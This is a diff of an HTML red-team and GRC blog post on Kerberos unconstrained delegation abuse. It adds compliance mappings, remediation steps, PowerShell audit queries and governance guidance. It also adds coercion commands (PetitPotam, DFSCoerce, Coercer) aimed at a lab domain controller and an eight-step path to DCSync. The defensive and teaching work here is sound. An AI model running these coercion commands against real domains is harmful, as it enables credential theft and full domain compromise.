@@ -44,7 +44,7 @@
                 <img src="../images/logo.png" alt="avatar" class="post-avatar">
                 <div class="post-meta-wrapper">
                     <h2 class="post-author"><a href="../pages/byt3n33dl3.html">byt3n33dl3</a></h2>
-                    <p class="post-date">Published Tue 20 January 2026</p>
+                    <p class="post-date"><ins>Updated</ins> Wed 21 January 2026</p>
                 </div>
             </div>
 
@@ -52,9 +52,9 @@
 
             <article class="post-content">
                 <h1>Kerberos Attack via Unconstrained Delegation with krbrelayx</h1>
-                <p class="post-tags">Tags: <a href="#">GRC</a> · <a href="#">Red Teaming</a> · <a href="#">Kerberos</a></p>
+                <p class="post-tags">Tags: <a href="#">Red Teaming</a> · <a href="#">GRC</a> · <a href="#">Kerberos</a> · <a href="#">Active Directory</a></p>
 
-                <p class="post-meta">Blog released: 2026 Tue 20 Jan.</p>
+                <p class="post-meta">Blog released: 2026 Tue 20 Jan, <ins>Updated</ins> on 2026 Wed 21 Jan.</p>
 
                 <h1>Legacy Kerberos Exploitation</h1>
 
@@ -76,7 +76,7 @@
                 
                 <p>However, during a recent Praetorian internal network security assessment, Praetorian engineers encountered a user object that was kerberoastable and configured with these privileges.</p>
                 
-                <p>PS that BloodHound won't (sometimes, collectors matter) show you this path. <ins>Antivirus won't stop it</ins>, it's pure Kerberos protocol abuse and attack.</p>
+                <p>PS that BloodHound won't (sometimes, collectors matter) show you this path. <a href="https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/considerations-known-issues"><ins>Antivirus won't stop it,</ins></a> it's pure Kerberos protocol abuse and attack.</p>
 
                 <div class="video-container">
                 <img alt="image-cerbersu" width="35%" src="../images/cerberus-image-no-bg.png"></iframe>
@@ -586,6 +586,223 @@ delegate\administrator</code></pre>
                 <ul>
                     <li>A.5.15: Access control regarding delegation settings not properly controlled</li>
                     <li>A.5.18: Access rights for excessive privileges granted</li>
+                </ul>
+
+                <p>NIST Cybersecurity Framework</p>
+                <ul>
+                    <li>PR.AC-4: Access permissions managed for delegation not properly controlled</li>
+                    <li>DE.CM-1: Network monitored as coercion attacks not detected</li>
+                </ul>
+
+                <h1>Remediation and Hardening</h1>
+
+                <p>Organizations must address unconstrained delegation through policy and technical controls.</p>
+
+                <h2>Immediate Actions</h2>
+
+                <p>Identify systems with unconstrained delegation:</p>
+
+                <pre><code class="language-powershell">Get-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation,ServicePrincipalNames | Select-Object Name,TrustedForDelegation,ServicePrincipalNames</code></pre>
+
+                <p>For each identified system, evaluate:</p>
+
+                <ol>
+                    <li>Is <ins>unconstrained delegation required</ins> for application functionality?</li>
+                    <li>Can it be replaced with constrained or RBCD as resource-based constrained delegation?</li>
+                    <li>If required, what compensating controls exist?</li>
+                </ol>
+
+                <h2>Policy Controls</h2>
+
+                <p>Implement formal approval processes:</p>
+
+                <ul>
+                    <li>Document business justification for delegation</li>
+                    <li>Require security review and approval</li>
+                    <li>Set expiration dates for delegation configurations</li>
+                    <li><ins>Conduct quarterly</ins> reviews of all delegation settings</li>
+                </ul>
+
+                <h2>Technical Controls</h2>
+
+                <p>Reduce attack surface through Group Policy:</p>
+
+                <p>Set <code>MachineAccountQuota</code> to zero:</p>
+
+                <pre><code class="language-powershell">Set-ADDomain -Identity delegate.vuln -Replace @{"ms-DS-MachineAccountQuota"="0"}</code></pre>
+
+                <h2>Protected Users Security Group</h2>
+
+                <p>Add privileged accounts to Protected Users group. This prevents:</p>
+
+                <ul>
+                    <li>NTLM authentication.</li>
+                    <li><code>DES or RC4</code> encryption in Kerberos.</li>
+                    <li>Delegation (constrained or unconstrained).</li>
+                    <li><ins>TGT renewal beyond</ins> initial 4-hour lifetime.</li>
+                </ul>
+
+                <p>Even if a protected user authenticates to a machine with unconstrained delegation, their TGT won't be cached.</p>
+
+                <h1>Alternative Attack Vectors</h1>
+
+                <p>This attack used PrinterBug for coercion, but multiple methods exist.</p>
+
+                <h2>PetitPotam</h2>
+
+                <p>Forces authentication via <code>MS-EFSRPC:</code></p>
+
+                <pre><code class="language-bash">python3 PetitPotam.py -u evil$ -p Passw0rd1 evil.delegate.vuln 192.168.2.68</code></pre>
+
+                <h2>DFSCoerce</h2>
+
+                <p>Abuses Distributed File System RPC calls:</p>
+
+                <pre><code class="language-bash">python3 dfscoerce.py -u evil$ -p Passw0rd1 evil.delegate.vuln 192.168.2.68</code></pre>
+
+                <h2>Coercer Tool</h2>
+
+                <p>Automated testing of multiple coercion methods:</p>
+
+                <pre><code class="language-bash">python3 Coercer.py -u evil$ -p Passw0rd1 -d delegate.vuln -l evil.delegate.vuln -t 192.168.2.68</code></pre>
+
+                <h1>Constrained Delegation as Alternative</h1>
+
+                <p>If delegation is legitimately required, constrained delegation limits the scope of impersonation.</p>
+
+                <h2>Configuring Constrained Delegation</h2>
+
+                <pre><code class="language-powershell">Set-ADComputer "WebServer" -Add @{'msDS-AllowedToDelegateTo'=@('MSSQLSvc/DBServer.delegate.vuln:1433','MSSQLSvc/DBServer:1433')}</code></pre>
+
+                <p>This allows WebServer to impersonate users only to the SQL service, not domain-wide.</p>
+
+                <h2>Resource-Based Constrained Delegation</h2>
+
+                <p>Even better, use RBCD where the target resource controls who can delegate:</p>
+
+                <pre><code class="language-powershell">Set-ADComputer "DBServer" -PrincipalsAllowedToDelegateToAccount "WebServer$"</code></pre>
+
+                <p>This inverts the trust model, the resource decides who can impersonate to it, rather than the front-end service having broad delegation rights.</p>
+
+                <h1>Governance Framework Implementation</h1>
+
+                <p>Organizations should implement formal governance for Kerberos delegation.</p>
+
+                <h2>Delegation Approval Process</h2>
+
+                <ol>
+                    <li>Application owner submits delegation request with business justification.</li>
+                    <li>Security team evaluates necessity and alternatives.</li>
+                    <li>Change Advisory Board approves with time limit.</li>
+                    <li>IT implements with compensating controls.</li>
+                    <li>SIEM rules configured.</li>
+                    <li>Quarterly validation that delegation still required.</li>
+                </ol>
+
+                <h2>Delegation Registry</h2>
+
+                <p>Maintain centralized tracking:</p>
+
+                <ul>
+                    <li>System name and purpose.</li>
+                    <li>Delegation type <ins>(unconstrained, constrained, RBCD).</ins></li>
+                    <li>Approval date and approver.</li>
+                    <li>Expiration or review date.</li>
+                    <li>Compensating controls.</li>
+                    <li>Monitoring requirements.</li>
+                </ul>
+
+                <h2>Risk Assessment Template</h2>
+
+                <p>Evaluate delegation requests against:</p>
+
+                <ul>
+                    <li>What can be compromised if this system is owned?</li>
+                    <li>What user accounts will authenticate to this system?</li>
+                    <li>Can constrained <ins>delegation or RBCD</ins> meet the requirement?</li>
+                    <li>Network segmentation, enhanced monitoring, etc.</li>
+                    <li>What breaks if delegation is removed?</li>
+                </ul>
+
+                <h1>Audit Queries for Compliance</h1>
+
+                <p>Regular auditing identifies risky configurations.</p>
+
+                <h2>Find Unconstrained Delegation</h2>
+
+                <pre><code class="language-powershell">Get-ADComputer -Filter * -Properties TrustedForDelegation | Where-Object {$_.TrustedForDelegation -eq $True -and $_.Name -ne 'DC1'} | Select-Object Name,DistinguishedName,TrustedForDelegation</code></pre>
+
+                <p>Exclude Domain Controllers as they require unconstrained delegation by design.</p>
+
+                <h2>Find SeEnableDelegationPrivilege Assignment</h2>
+
+                <pre><code class="language-powershell">secedit /export /cfg c:\secpol.cfg</code></pre>
+
+                <pre><code class="language-powershell">Get-Content c:\secpol.cfg | Select-String "SeEnableDelegationPrivilege"</code></pre>
+
+                <p>This right should only be assigned to specific administrative groups, never to standard user groups.</p>
+
+                <h2>Monitor Computer Account Creation</h2>
+
+                <p>Event <code>ID 4741</code> logs computer account creation. Alert on creation by non-IT accounts:</p>
+
+                <pre><code class="language-powershell">Get-WinEvent -FilterHashtable @{LogName='Security';ID=4741} -MaxEvents 100 | Where-Object {$_.Properties[4].Value -notmatch 'IT-Admins|Domain Admins'} | Format-Table TimeCreated,@{L='Creator';E={$_.Properties[4].Value}},@{L='Computer';E={$_.Properties[0].Value}}</code></pre>
+
+                <h1>Lessons for Security Programs</h1>
+
+                <p>This attack reveals gaps in typical security programs.</p>
+
+                <h2>Tools Don't Replace Understanding</h2>
+
+                <p><ins>BloodHound is invaluable but doesn't show every attack path.</ins> Security teams must understand Active Directory mechanics beyond tool output.</p>
+
+                <h2>Default Configurations Are Security Decisions</h2>
+
+                <p>Leaving <code>MachineAccountQuota</code> at 10 is a security decision, not a neutral default. Every default configuration should be evaluated and justified.</p>
+
+                <h2>User Rights Are Privileges</h2>
+
+                <p><code>SeEnableDelegationPrivilege</code> is as dangerous as <code>SeDebugPrivilege</code> or <code>SeBackupPrivilege</code>, yet it's rarely included in privilege management programs.</p>
+
+                <h2>Legacy Features Persist</h2>
+
+                <p>Unconstrained <ins>delegation was deprecated in 2003.</ins> Twenty years later, it's still exploitable in production environments. Deprecation doesn't mean removal, legacy features require active hardening.</p>
+
+                <h1>Conclusion</h1>
+
+                <p>Kerberos Unconstrained Delegation abuse demonstrates that effective Active Directory attacks don't require vulnerabilities, they exploit design decisions and misconfigurations that persist across decades.</p>
+
+                <p>From initial access to domain compromise:</p>
+
+                <ol>
+                    <li>Identify <code>SeEnableDelegationPrivilege.</code></li>
+                    <li>Create controlled computer account.</li>
+                    <li>Configure unconstrained delegation.</li>
+                    <li>Setup DNS and SPN records.</li>
+                    <li>Run krbrelayx listener.</li>
+                    <li>Coerce DC authentication.</li>
+                    <li>Capture DC TGT.</li>
+                    <li>Execute DCSync.</li>
+                </ol>
+
+                <p>Eight steps, all using legitimate Kerberos functionality. No exploitation, no vulnerability, just trust model abuse.</p>
+
+                <p>Defense requires governance: formal approval processes, configuration inventories, regular auditing, and treating delegation settings as critical security parameters.</p> 
+                
+                <p>Technical controls alone are insufficient, organizations need policy frameworks that prevent these configurations from being deployed in the first place.</p>
+
+                <h1>Tools and Resources</h1>
+
+                <ul>
+                    <li><a href="https://github.com/dirkjanm/krbrelayx">krbrelayx</a></li>
+                    <li><a href="https://github.com/fortra/impacket">Impacket</a></li>
+                </ul>
+
+                <h1>Shout Outs</h1>
+
+                <ul>
+                    <li><a href="https://twitter.com/_dirkjan/">@_dirkjan</a> as krbrelayx developer</li>
+                    <li><a href="https://specterops.io/">@SpecterOps</a></li>
                 </ul>
 
                 <p>I think that's most of it for us Adversaries and some <code>sparks</code> of GRC.</p>
